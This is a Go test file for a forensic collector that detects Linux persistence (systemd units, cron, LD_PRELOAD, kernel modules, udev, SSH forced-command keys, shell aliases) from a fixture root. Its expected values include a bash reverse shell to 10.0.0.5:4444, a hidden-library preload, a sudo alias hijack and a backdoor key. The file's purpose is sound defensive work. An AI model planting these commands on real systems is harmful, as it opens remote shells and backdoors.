package startup

import (
	"encoding/json"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

func TestCollectFindsSystemdUnitsCronJobsAndPersistenceItems(t *testing.T) {
	result, err := Collect(filepath.Join("..", "testdata", "root"))
	if err != nil {
		t.Fatalf("collect startup: %v", err)
	}
	if len(result.Services) != 3 {
		t.Fatalf("expected three services, got %#v", result.Services)
	}
	service := findService(result.Services, "evil.service")
	if service.Name != "evil.service" || service.Description != "Suspicious reverse shell" {
		t.Fatalf("unexpected service metadata: %#v", service)
	}
	if service.ExecStart != "/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" || service.WantedBy != "multi-user.target" {
		t.Fatalf("unexpected service execution metadata: %#v", service)
	}

	if len(result.Timers) != 1 {
		t.Fatalf("expected one timer, got %#v", result.Timers)
	}
	timer := result.Timers[0]
	if timer.Name != "backup.timer" || timer.OnCalendar != "*-*-* 03:00:00" || timer.Unit != "backup.service" || timer.WantedBy != "timers.target" {
		t.Fatalf("unexpected timer metadata: %#v", timer)
	}

	if len(result.CronJobs) != 4 {
		t.Fatalf("expected four cron jobs, got %#v", result.CronJobs)
	}
	systemCron := findCronJob(result.CronJobs, "/usr/local/bin/persist.sh")
	if systemCron.User != "root" || systemCron.Schedule != "*/5 * * * *" {
		t.Fatalf("unexpected system cron job: %#v", systemCron)
	}
	spoolCron := findCronJob(result.CronJobs, "/home/alice/.local/bin/agent")
	if spoolCron.User != "alice" || spoolCron.Schedule != "@reboot" {
		t.Fatalf("unexpected spool cron job: %#v", spoolCron)
	}
	runPartsCron := findCronJob(result.CronJobs, filepath.Join("etc", "cron.daily", "cleanup"))
	if runPartsCron.User != "root" || runPartsCron.Schedule != "@daily" || runPartsCron.Source != filepath.Join("etc", "cron.daily", "cleanup") {
		t.Fatalf("unexpected run-parts cron job: %#v", runPartsCron)
	}

	if len(result.PersistenceItems) != 31 {
		t.Fatalf("expected persistence item per startup artifact, got %#v", result.PersistenceItems)
	}
	serviceItem := findPersistenceItem(t, result.PersistenceItems, "systemd_service", "evil.service")
	if serviceItem.Command != "/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" {
		t.Fatalf("unexpected service persistence item: %#v", serviceItem)
	}
	if len(result.Sources) != 27 {
		t.Fatalf("expected twenty-seven sources, got %#v", result.Sources)
	}
	runPartsItem := findPersistenceItem(t, result.PersistenceItems, "cron_run_parts", "cleanup")
	if runPartsItem.SourceType != "cron_run_parts" || runPartsItem.Command != filepath.Join("etc", "cron.daily", "cleanup") {
		t.Fatalf("unexpected run-parts persistence item: %#v", runPartsItem)
	}
	preloadItem := findPersistenceItem(t, result.PersistenceItems, "ld_preload", "ld.so.preload:1")
	if preloadItem.Source != filepath.Join("etc", "ld.so.preload") || preloadItem.Command != "/usr/local/lib/libpersist.so" {
		t.Fatalf("unexpected dynamic loader preload item: %#v", preloadItem)
	}
	if preloadItem.User != "root" || preloadItem.SourceType != "ld_preload" || preloadItem.EnabledState != "configured" {
		t.Fatalf("unexpected dynamic loader preload metadata: %#v", preloadItem)
	}
	if len(preloadItem.SecurityFindings) != 1 || preloadItem.SecurityFindings[0].Severity != "high" || preloadItem.SecurityFindings[0].Reason != "dynamic_loader_preload" {
		t.Fatalf("expected high severity preload finding, got %#v", preloadItem.SecurityFindings)
	}
	loadedModule := findPersistenceItem(t, result.PersistenceItems, "kernel_module_loaded", "kstealth")
	if loadedModule.Source != filepath.Join("proc", "modules") || loadedModule.Command != "size=16384; used_by=0; state=Live" {
		t.Fatalf("unexpected loaded kernel module item: %#v", loadedModule)
	}
	if loadedModule.SourceType != "kernel_module_loaded" || loadedModule.EnabledState != "loaded" {
		t.Fatalf("unexpected loaded kernel module metadata: %#v", loadedModule)
	}
	if loadedModule.Config["taint"][0] != "OE" || loadedModule.Config["initState"][0] != "live" || loadedModule.Config["parameter:hide_pid"][0] != "957" {
		t.Fatalf("expected loaded module sysfs evidence, got %#v", loadedModule.Config)
	}
	if !hasFindingReason(loadedModule.SecurityFindings, "kernel_module_out_of_tree") ||
		!hasFindingReason(loadedModule.SecurityFindings, "kernel_module_unsigned") {
		t.Fatalf("expected loaded module taint findings, got %#v", loadedModule.SecurityFindings)
	}
	autoLoadModule := findPersistenceItem(t, result.PersistenceItems, "kernel_module_autoload", "evilmod")
	if autoLoadModule.Source != filepath.Join("etc", "modules-load.d", "evil.conf") || autoLoadModule.Command != "evilmod" {
		t.Fatalf("unexpected module autoload item: %#v", autoLoadModule)
	}
	modprobeHook := findPersistenceItem(t, result.PersistenceItems, "modprobe_policy", "install:netfilter")
	if modprobeHook.Source != filepath.Join("etc", "modprobe.d", "persist.conf") || modprobeHook.Command != "/usr/local/bin/netfilter-loader --module netfilter" {
		t.Fatalf("unexpected modprobe policy item: %#v", modprobeHook)
	}
	if len(modprobeHook.SecurityFindings) != 1 || modprobeHook.SecurityFindings[0].Reason != "modprobe_install_hook" {
		t.Fatalf("expected modprobe install hook finding, got %#v", modprobeHook.SecurityFindings)
	}
	udevRule := findPersistenceItem(t, result.PersistenceItems, "udev_rule", "99-persist.rules:1")
	if udevRule.Source != filepath.Join("etc", "udev", "rules.d", "99-persist.rules") || udevRule.Command != "/tmp/.cache/udev-helper --device %k" {
		t.Fatalf("unexpected udev rule item: %#v", udevRule)
	}
	if udevRule.Config["action"][0] != "add" || udevRule.Config["subsystem"][0] != "block" || udevRule.Config["run"][0] != "/tmp/.cache/udev-helper --device %k" {
		t.Fatalf("expected udev rule config evidence, got %#v", udevRule.Config)
	}
	if !hasFindingReason(udevRule.SecurityFindings, "udev_run_hook") || !hasFindingReason(udevRule.SecurityFindings, "udev_temp_path") {
		t.Fatalf("expected udev findings, got %#v", udevRule.SecurityFindings)
	}
	pathItem := findPersistenceItem(t, result.PersistenceItems, "systemd_path", "watch-cache.path")
	if pathItem.Source != filepath.Join("etc", "systemd", "system", "watch-cache.path") || pathItem.Command != "PathChanged=/tmp/.trigger; Unit=evil.service" {
		t.Fatalf("unexpected systemd path item: %#v", pathItem)
	}
	if pathItem.Config["pathChanged"][0] != "/tmp/.trigger" || pathItem.Config["unit"][0] != "evil.service" {
		t.Fatalf("expected systemd path config evidence, got %#v", pathItem.Config)
	}
	if !hasFindingReason(pathItem.SecurityFindings, "systemd_path_trigger") || !hasFindingReason(pathItem.SecurityFindings, "systemd_path_temp_path") {
		t.Fatalf("expected systemd path findings, got %#v", pathItem.SecurityFindings)
	}
	logrotateItem := findPersistenceItem(t, result.PersistenceItems, "logrotate_script", "persist:postrotate:3")
	if logrotateItem.Source != filepath.Join("etc", "logrotate.d", "persist") || logrotateItem.Command != "/tmp/.cache/logrotate-agent --rotate /var/log/app.log" {
		t.Fatalf("unexpected logrotate script item: %#v", logrotateItem)
	}
	if logrotateItem.Config["target"][0] != "/var/log/app.log" || logrotateItem.Config["block"][0] != "postrotate" {
		t.Fatalf("expected logrotate config evidence, got %#v", logrotateItem.Config)
	}
	if !hasFindingReason(logrotateItem.SecurityFindings, "logrotate_script_hook") || !hasFindingReason(logrotateItem.SecurityFindings, "logrotate_temp_path") {
		t.Fatalf("expected logrotate findings, got %#v", logrotateItem.SecurityFindings)
	}
	atItem := findPersistenceItem(t, result.PersistenceItems, "at_job", "a0000101:4")
	if atItem.Source != filepath.Join("var", "spool", "atjobs", "a0000101") || atItem.Command != "/tmp/.cache/at-agent --once" {
		t.Fatalf("unexpected at job item: %#v", atItem)
	}
	if atItem.User != "uid=1000" || atItem.Config["uid"][0] != "1000" || atItem.Config["gid"][0] != "1000" {
		t.Fatalf("expected at job uid/gid evidence, got %#v", atItem)
	}
	if !hasFindingReason(atItem.SecurityFindings, "at_job_command") || !hasFindingReason(atItem.SecurityFindings, "at_job_temp_path") {
		t.Fatalf("expected at job findings, got %#v", atItem.SecurityFindings)
	}
	anacronItem := findPersistenceItem(t, result.PersistenceItems, "anacron_job", "persist-daily")
	if anacronItem.Source != filepath.Join("etc", "anacrontab") || anacronItem.Command != "/tmp/.cache/anacron-agent --daily" {
		t.Fatalf("unexpected anacron item: %#v", anacronItem)
	}
	if anacronItem.Config["period"][0] != "1" || anacronItem.Config["delay"][0] != "5" || anacronItem.Config["jobId"][0] != "persist-daily" {
		t.Fatalf("expected anacron config evidence, got %#v", anacronItem.Config)
	}
	if !hasFindingReason(anacronItem.SecurityFindings, "anacron_job_command") || !hasFindingReason(anacronItem.SecurityFindings, "anacron_temp_path") {
		t.Fatalf("expected anacron findings, got %#v", anacronItem.SecurityFindings)
	}
	authorizedKeyItem := findPersistenceItem(t, result.PersistenceItems, "ssh_authorized_key", "alice:authorized_keys:1")
	if authorizedKeyItem.Source != filepath.Join("home", "alice", ".ssh", "authorized_keys") || authorizedKeyItem.User != "alice" {
		t.Fatalf("unexpected authorized key item: %#v", authorizedKeyItem)
	}
	if authorizedKeyItem.Command != "/tmp/.cache/sshd-backdoor --session" || authorizedKeyItem.Config["keyType"][0] != "ssh-rsa" || authorizedKeyItem.Config["comment"][0] != "backdoor@example" {
		t.Fatalf("expected authorized key command/key metadata, got %#v", authorizedKeyItem)
	}
	if authorizedKeyItem.Config["option:from"][0] != "10.0.0.*" || authorizedKeyItem.Config["fingerprint"][0] == "" {
		t.Fatalf("expected authorized key option and fingerprint evidence, got %#v", authorizedKeyItem.Config)
	}
	if !hasFindingReason(authorizedKeyItem.SecurityFindings, "ssh_authorized_key_forced_command") ||
		!hasFindingReason(authorizedKeyItem.SecurityFindings, "ssh_authorized_key_temp_command") {
		t.Fatalf("expected authorized key findings, got %#v", authorizedKeyItem.SecurityFindings)
	}
	encodedAuthorizedKeyItem, err := json.Marshal(authorizedKeyItem)
	if err != nil {
		t.Fatalf("marshal authorized key item: %v", err)
	}
	if strings.Contains(string(encodedAuthorizedKeyItem), "AAAAB3NzaC1yc2EAAAADAQABAAABAQC7") || strings.Contains(string(encodedAuthorizedKeyItem), "keyMaterial") {
		t.Fatalf("authorized key evidence must not expose raw public key material: %s", encodedAuthorizedKeyItem)
	}
}

func TestCollectLinuxStartupPersistenceSemantics(t *testing.T) {
	result, err := Collect(filepath.Join("..", "testdata", "root"))
	if err != nil {
		t.Fatalf("collect startup: %v", err)
	}
	svc := findService(result.Services, "accounts-daemon.service")
	if svc.SourceType != "systemd_service" || svc.EnabledState != "enabled" || svc.User == "" {
		t.Fatalf("expected linux service semantics, got %#v", svc)
	}
	if svc.ActiveState != "unavailable_offline_root" || !testContains(svc.Wants, "dbus.socket") {
		t.Fatalf("expected offline active state and wants metadata, got %#v", svc)
	}
	if len(result.PersistenceItems) < 3 {
		t.Fatalf("expected services/timers/cron persistence rows, got %#v", result.PersistenceItems)
	}
	socketItem := findPersistenceItem(t, result.PersistenceItems, "systemd_socket", "web.socket")
	if socketItem.SourceType != "systemd_socket" || socketItem.EnabledState != "disabled" {
		t.Fatalf("expected socket persistence semantics, got %#v", socketItem)
	}
}

func TestAuthorizedKeyParserDoesNotRetainRawKeyMaterial(t *testing.T) {
	entry, ok := parseSSHAuthorizedKeyLine(`command="/tmp/.cache/sshd-backdoor --session" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 backdoor@example`)
	if !ok {
		t.Fatalf("expected authorized key line to parse")
	}
	if entry.Fingerprint == "" || entry.KeyType != "ssh-rsa" {
		t.Fatalf("expected fingerprint-only authorized key metadata, got %#v", entry)
	}
	if _, exists := reflect.TypeOf(entry).FieldByName("KeyMaterial"); exists {
		t.Fatalf("authorized key parser must not retain raw public key material")
	}
}

func TestCollectFindsUserSystemdUnits(t *testing.T) {
	result, err := Collect(filepath.Join("..", "testdata", "root"))
	if err != nil {
		t.Fatalf("collect startup: %v", err)
	}

	service := findService(result.Services, "user-agent.service")
	if service.Source != filepath.Join("home", "alice", ".config", "systemd", "user", "user-agent.service") {
		t.Fatalf("expected user systemd source, got %#v", service)
	}
	if service.User != "alice" || service.SourceType != "systemd_service" {
		t.Fatalf("expected user systemd owner metadata, got %#v", service)
	}
	if service.ExecStart != "/home/alice/.local/bin/agent --foreground" {
		t.Fatalf("unexpected user service command: %#v", service)
	}

	item := findPersistenceItem(t, result.PersistenceItems, "systemd_service", "user-agent.service")
	if item.User != "alice" || item.Source != service.Source || item.Command != service.ExecStart {
		t.Fatalf("unexpected user systemd persistence item: %#v", item)
	}
}

func TestCollectFindsSystemdDropInOverrides(t *testing.T) {
	result, err := Collect(filepath.Join("..", "testdata", "root"))
	if err != nil {
		t.Fatalf("collect startup: %v", err)
	}

	item := findPersistenceItem(t, result.PersistenceItems, "systemd_dropin", filepath.Join("ssh.service.d", "override.conf"))
	if item.Source != filepath.Join("etc", "systemd", "system", "ssh.service.d", "override.conf") || item.User != "root" {
		t.Fatalf("unexpected systemd drop-in source metadata: %#v", item)
	}
	if item.SourceType != "systemd_dropin" || item.EnabledState != "configured" || item.Command != "ExecStart=/tmp/.cache/sshd -D; Environment=LD_PRELOAD=/tmp/libhide.so" {
		t.Fatalf("unexpected systemd drop-in command metadata: %#v", item)
	}
	if item.Config["unit"][0] != "ssh.service" || item.Config["execStart"][0] != "" || item.Config["execStart"][1] != "/tmp/.cache/sshd -D" || item.Config["environment"][0] != "LD_PRELOAD=/tmp/libhide.so" {
		t.Fatalf("expected systemd drop-in config evidence, got %#v", item.Config)
	}
	if !hasFindingReason(item.SecurityFindings, "systemd_dropin_exec_override") ||
		!hasFindingReason(item.SecurityFindings, "systemd_dropin_temp_path") ||
		!hasFindingReason(item.SecurityFindings, "systemd_dropin_ld_preload") {
		t.Fatalf("expected systemd drop-in forensic findings, got %#v", item.SecurityFindings)
	}
}

func TestCollectFindsShellStartupPersistence(t *testing.T) {
	result, err := Collect(filepath.Join("..", "testdata", "root"))
	if err != nil {
		t.Fatalf("collect startup: %v", err)
	}

	globalItem := findPersistenceItem(t, result.PersistenceItems, "shell_startup", "agent.sh:2")
	if globalItem.Source != filepath.Join("etc", "profile.d", "agent.sh") || globalItem.User != "root" {
		t.Fatalf("unexpected global shell startup item: %#v", globalItem)
	}
	if globalItem.Command != "/usr/local/bin/agent --daemon" || globalItem.SourceType != "shell_startup" {
		t.Fatalf("unexpected global shell startup command: %#v", globalItem)
	}

	userItem := findPersistenceItem(t, result.PersistenceItems, "shell_startup", ".bashrc:2")
	if userItem.Source != filepath.Join("home", "alice", ".bashrc") || userItem.User != "alice" {
		t.Fatalf("unexpected user shell startup item: %#v", userItem)
	}
	if userItem.Command != "nohup /home/alice/.local/bin/agent >/tmp/agent.log 2>&1 &" {
		t.Fatalf("unexpected user shell startup command: %#v", userItem)
	}

	aliasItem := findPersistenceItem(t, result.PersistenceItems, "shell_alias", ".bashrc:3:sudo")
	if aliasItem.Source != filepath.Join("home", "alice", ".bashrc") || aliasItem.User != "alice" {
		t.Fatalf("unexpected shell alias item: %#v", aliasItem)
	}
	if aliasItem.Command != "alias sudo='/home/alice/.local/bin/sudo'" || aliasItem.SourceType != "shell_alias" {
		t.Fatalf("unexpected shell alias command: %#v", aliasItem)
	}
	if aliasItem.Config["alias"][0] != "sudo" || aliasItem.Config["aliasTarget"][0] != "/home/alice/.local/bin/sudo" {
		t.Fatalf("expected shell alias target metadata, got %#v", aliasItem.Config)
	}
	if !hasFindingReason(aliasItem.SecurityFindings, "shell_alias_privileged_command_override") ||
		!hasFindingReason(aliasItem.SecurityFindings, "shell_alias_suspicious_target_path") {
		t.Fatalf("expected privileged command alias finding, got %#v", aliasItem.SecurityFindings)
	}

	sourceItem := findPersistenceItem(t, result.PersistenceItems, "shell_source", ".bashrc:4:.profile")
	if sourceItem.Source != filepath.Join("home", "alice", ".bashrc") || sourceItem.User != "alice" {
		t.Fatalf("unexpected shell source item: %#v", sourceItem)
	}
	if sourceItem.Command != "source ~/.profile" || sourceItem.Config["target"][0] != "~/.profile" {
		t.Fatalf("unexpected shell source command metadata: %#v", sourceItem)
	}

	functionItem := findPersistenceItem(t, result.PersistenceItems, "shell_function", ".bashrc:5:ll")
	if functionItem.Command != "ll(){ /tmp/.cache/ls --color=auto \"$@\"; }" || functionItem.Config["function"][0] != "ll" {
		t.Fatalf("unexpected shell function item: %#v", functionItem)
	}

	pathItem := findPersistenceItem(t, result.PersistenceItems, "shell_path", ".bashrc:6:PATH")
	if pathItem.Command != "export PATH=\"/tmp/bin:$HOME/bin:$PATH\"" || pathItem.Config["pathEntry"][0] != "/tmp/bin" {
		t.Fatalf("unexpected shell PATH item: %#v", pathItem)
	}
	if len(pathItem.SecurityFindings) != 1 || pathItem.SecurityFindings[0].Reason != "shell_path_temp_directory" {
		t.Fatalf("expected shell PATH temp directory finding, got %#v", pathItem.SecurityFindings)
	}
}

func TestCollectFindsRcLocalAndInitDScripts(t *testing.T) {
	result, err := Collect(filepath.Join("..", "testdata", "root"))
	if err != nil {
		t.Fatalf("collect startup: %v", err)
	}

	rcLocal := findPersistenceItem(t, result.PersistenceItems, "legacy_startup", "rc.local")
	if rcLocal.Source != filepath.Join("etc", "rc.local") || rcLocal.Command != "/usr/local/bin/legacy-agent start" {
		t.Fatalf("unexpected rc.local startup item: %#v", rcLocal)
	}

	initd := findPersistenceItem(t, result.PersistenceItems, "legacy_startup", "legacy-agent")
	if initd.Source != filepath.Join("etc", "init.d", "legacy-agent") || initd.Command != "/etc/init.d/legacy-agent" {
		t.Fatalf("unexpected init.d startup item: %#v", initd)
	}
}

func TestCollectFindsDesktopAutostartEntries(t *testing.T) {
	result, err := Collect(filepath.Join("..", "testdata", "root"))
	if err != nil {
		t.Fatalf("collect startup: %v", err)
	}

	globalItem := findPersistenceItem(t, result.PersistenceItems, "desktop_autostart", "global-agent.desktop")
	if globalItem.Source != filepath.Join("etc", "xdg", "autostart", "global-agent.desktop") || globalItem.User != "root" {
		t.Fatalf("unexpected global autostart item: %#v", globalItem)
	}
	if globalItem.Command != "/usr/local/bin/global-agent --start" {
		t.Fatalf("unexpected global autostart command: %#v", globalItem)
	}

	userItem := findPersistenceItem(t, result.PersistenceItems, "desktop_autostart", "user-agent.desktop")
	if userItem.Source != filepath.Join("home", "alice", ".config", "autostart", "user-agent.desktop") || userItem.User != "alice" {
		t.Fatalf("unexpected user autostart item: %#v", userItem)
	}
	if userItem.Command != "/home/alice/.local/bin/gui-agent --tray" {
		t.Fatalf("unexpected user autostart command: %#v", userItem)
	}
}

func TestCollectParsesSSHDConfigSecurityFindings(t *testing.T) {
	result, err := Collect(filepath.Join("..", "testdata", "root"))
	if err != nil {
		t.Fatalf("collect startup: %v", err)
	}
	item := findPersistenceItem(t, result.PersistenceItems, "sshd_config", "sshd_config")
	if item.Source != filepath.Join("etc", "ssh", "sshd_config") {
		t.Fatalf("expected sshd_config source, got %#v", item)
	}
	if len(item.SecurityFindings) != 3 {
		t.Fatalf("expected three sshd_config findings, got %#v", item.SecurityFindings)
	}
	if item.SecurityFindings[0].Key != "PermitRootLogin" || item.SecurityFindings[0].Value != "yes" || item.SecurityFindings[0].Severity != "high" {
		t.Fatalf("expected root login high finding, got %#v", item.SecurityFindings[0])
	}
	if item.SecurityFindings[1].Key != "PasswordAuthentication" || item.SecurityFindings[1].Severity != "medium" {
		t.Fatalf("expected password auth finding, got %#v", item.SecurityFindings[1])
	}
	if item.SecurityFindings[2].Key != "AuthorizedKeysFile" || item.SecurityFindings[2].Value != ".ssh/authorized_keys .ssh/authorized_keys2" {
		t.Fatalf("expected authorized keys path finding, got %#v", item.SecurityFindings[2])
	}
}

func findService(services []Service, name string) Service {
	for _, service := range services {
		if service.Name == name {
			return service
		}
	}
	return Service{}
}

func findCronJob(jobs []CronJob, command string) CronJob {
	for _, job := range jobs {
		if job.Command == command {
			return job
		}
	}
	return CronJob{}
}

func TestCollectToleratesMissingStartupLocations(t *testing.T) {
	result, err := Collect(t.TempDir())
	if err != nil {
		t.Fatalf("collect missing startup locations: %v", err)
	}
	if len(result.Services) != 0 || len(result.Timers) != 0 || len(result.CronJobs) != 0 || len(result.PersistenceItems) != 0 {
		t.Fatalf("expected empty result, got %#v", result)
	}
}

func testContains(values []string, target string) bool {
	for _, value := range values {
		if value == target {
			return true
		}
	}
	return false
}

func hasFindingReason(findings []SSHConfigFinding, reason string) bool {
	for _, finding := range findings {
		if finding.Reason == reason {
			return true
		}
	}
	return false
}

func findPersistenceItem(t *testing.T, items []PersistenceItem, kind string, name string) PersistenceItem {
	t.Helper()
	for _, item := range items {
		if item.Kind == kind && item.Name == name {
			return item
		}
	}
	t.Fatalf("expected persistence item %s/%s in %#v", kind, name, items)
	return PersistenceItem{}
}
